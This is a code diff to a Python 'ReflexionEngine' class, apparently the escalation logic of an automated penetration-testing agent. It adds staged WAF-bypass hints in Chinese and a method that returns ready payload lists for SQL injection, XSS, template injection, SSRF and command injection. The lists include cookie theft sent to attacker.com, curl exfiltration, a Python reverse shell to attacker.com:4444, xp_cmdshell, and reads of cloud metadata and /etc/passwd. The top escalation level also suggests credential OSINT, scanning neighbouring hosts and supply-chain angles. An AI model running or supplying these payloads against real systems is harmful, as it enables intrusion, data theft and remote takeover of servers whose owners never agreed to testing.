@@ -40,7 +40,7 @@ class ReflexionEngine(BaseModel):
     max_same_vuln_fails: int = 2
     max_total_no_progress: int = 5
     max_reflections_before_escalate: int = 3
-    escalation_max_level: int = 4
+    escalation_max_level: int = 5
     state: ReflexionState = Field(default_factory=ReflexionState)
 
     def record_attempt(
@@ -96,31 +96,133 @@ class ReflexionEngine(BaseModel):
 
     def get_escalation_hints(self) -> list[str]:
         hints_by_level = {
-            0: ["先尝试原始 payload（不编码）。"],
+            0: [
+                "先尝试原始 payload（不编码）。",
+                "确认注入点类型（GET参数/POST body/Header/Cookie/JSON/XML）。",
+                "验证错误响应是否反映了输入（错误回显 vs 盲注）。",
+            ],
             1: [
-                "URL 编码特殊字符。",
-                "切换关键字大小写（SeLeCt）。",
-                "尝试空白符变体（/**/、换行、Tab）。",
+                "URL 编码特殊字符（%27=%27, %3D==, %20=空格）。",
+                "切换关键字大小写（SeLeCt、uNiOn、WheRe）。",
+                "尝试空白符变体：/**/ 或 %09(Tab) 或 %0a(换行) 或 %0d(CR)。",
+                "在 SQLi 中：注释变体 -- 、#、/*!50000*/。",
+                "XSS：尝试大小写混合标签 <ScRiPt>alert(1)</ScRiPt>。",
             ],
             2: [
-                "尝试双重 URL 编码。",
-                "插入内联注释，如 /**/。",
-                "面向浏览器的注入点使用 HTML 实体编码。",
+                "双重 URL 编码：%2527 代替 %27（单引号），%253C 代替 %3C（尖括号）。",
+                "插入内联注释拆分关键字：SE/**/LECT、UN/**/ION。",
+                "HTML 实体编码注入点：&#x27; &#60; &amp; &lt;。",
+                "JSON Unicode 转义：\\u0022 代替引号，\\u003c 代替 <。",
+                "XSS：事件处理属性绕过 <img src=x onerror=alert(1)>。",
+                "SSRF：使用 http://2130706433/ (127.0.0.1 十进制表示)。",
             ],
             3: [
-                "尝试 Unicode 转义（\\u0027）。",
-                "尝试 hex 编码（0x...）。",
-                "用字符串拼接拆分关键字（con||cat）。",
-                "用等价的替代函数绕过被封函数。",
+                "Unicode 转义：\\u0027（单引号）、\\u003e（>）、\\u003c（<）。",
+                "Hex 编码 SQL：0x53454c454354 代替 'SELECT'。",
+                "字符串拼接拆分关键字：con||cat、CHAR(115)||CHAR(101)。",
+                "用等价函数替换被封函数：MID() 代替 SUBSTRING()、LPAD() 代替 LEFT()。",
+                "NoSQLi 算子注入：{\"$gt\":\"\"}、{\"$where\":\"1==1\"}。",
+                "HTTP 参数污染：?id=1&id=2（利用服务器解析差异）。",
+                "路径遍历变体：..%2F、..%252F、....//、%2e%2e%2f。",
+                "XSS：利用 SVG/MathML：<svg><script>alert(1)</script></svg>。",
             ],
             4: [
-                "组合多层编码混淆。",
-                "改用替代语法达成同样目的（如 HANDLER 代替 SELECT）。",
-                "改用时间盲注或带外（OOB）通道确认。",
-                "切换到完全不同的漏洞类型/攻击面。",
+                "组合多层编码：先 HTML 实体 + 再 URL 编码 + 再 Unicode 转义。",
+                "SQL 替代语法：HANDLER table OPEN/READ（MySQL）代替 SELECT。",
+                "时间盲注：SLEEP(5)、WAITFOR DELAY '0:0:5'、pg_sleep(5)。",
+                "带外（OOB）通道：load_file()、UTL_HTTP、xp_dirtree 到你控制的服务器。",
+                "二阶注入：先存储恶意 payload，再触发执行。",
+                "切换到完全不同的漏洞类型/攻击面（换 SSRF、XXE、SSTI、文件上传等）。",
+                "利用解析差异：Nginx vs App、CDN vs Origin、JSON vs XML 同一端点。",
+                "原型链污染：__proto__[admin]=true、constructor[prototype][x]=1。",
+            ],
+            5: [
+                "最终手段：切换整个攻击类别（Web → 网络服务、前端 → 后端 API）。",
+                "利用已知 CVE：搜索目标技术栈的 已知 N-day 漏洞。",
+                "社工/OSINT 角度：寻找泄露凭证、内部员工信息。",
+                "对目标基础设施做旁站/C段扫描，找更弱的入口点。",
+                "检查第三方依赖链（供应链攻击面）。",
             ],
         }
-        return hints_by_level[self.get_escalation_level()]
+        level = min(self.get_escalation_level(), 5)
+        return hints_by_level[level]
+
+    def get_waf_bypass_payloads(self, vuln_type: str = "") -> list[str]:
+        """Return specific WAF bypass payload templates for common vuln types."""
+        vtype = (vuln_type or self.state.last_vuln_type or "").lower()
+
+        if "sqli" in vtype or "sql" in vtype:
+            return [
+                "' OR 1=1-- -",
+                "' OR '1'='1",
+                "1' AND SLEEP(5)-- -",
+                "1 UNION SELECT NULL,NULL,NULL-- -",
+                "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -",
+                "1;SELECT * FROM users--",
+                "' OR 1=1 LIMIT 1 OFFSET 0-- -",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+                "'; EXEC xp_cmdshell('whoami');--",
+                "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+            ]
+        elif "xss" in vtype:
+            return [
+                "<script>alert(document.cookie)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                "javascript:alert(1)",
+                "'><script>alert(document.domain)</script>",
+                "<iframe src=javascript:alert(1)>",
+                "<body onload=alert(1)>",
+                "<%2fscript><%53cript>alert(1)</%53cript>",
+                "\"><img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>",
+                "<details open ontoggle=alert(1)>",
+            ]
+        elif "ssti" in vtype or "template" in vtype:
+            return [
+                "{{7*7}}",
+                "${7*7}",
+                "#{7*7}",
+                "{{config}}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                "${T(java.lang.Runtime).getRuntime().exec('id')}",
+                "{{range.class.forName('java.lang.Runtime').getMethod('exec',range.class.forName('java.lang.String')).invoke(range.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}",
+            ]
+        elif "ssrf" in vtype:
+            return [
+                "http://127.0.0.1/",
+                "http://localhost/",
+                "http://169.254.169.254/latest/meta-data/",
+                "http://[::1]/",
+                "http://2130706433/",   # 127.0.0.1 decimal
+                "http://0x7f000001/",   # 127.0.0.1 hex
+                "dict://127.0.0.1:6379/",
+                "file:///etc/passwd",
+                "gopher://127.0.0.1:6379/_FLUSHALL",
+                "http://metadata.google.internal/computeMetadata/v1/",
+            ]
+        elif "rce" in vtype or "command" in vtype or "cmd" in vtype:
+            return [
+                "; id",
+                "| id",
+                "` id `",
+                "$(id)",
+                "&& id",
+                "; cat /etc/passwd",
+                "| cat /etc/passwd",
+                "; curl http://attacker.com/$(whoami)",
+                "$(curl${IFS}http://attacker.com/$(id))",
+                "; python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+            ]
+        else:
+            return [
+                "../../../etc/passwd",
+                "' OR '1'='1",
+                "<script>alert(1)</script>",
+                "{{7*7}}",
+                "; id",
+                "http://127.0.0.1/",
+            ]
 
     def record_reflection(self, old_path: str, new_path: str, reasoning: str) -> None:
         self.state.reflections.append(
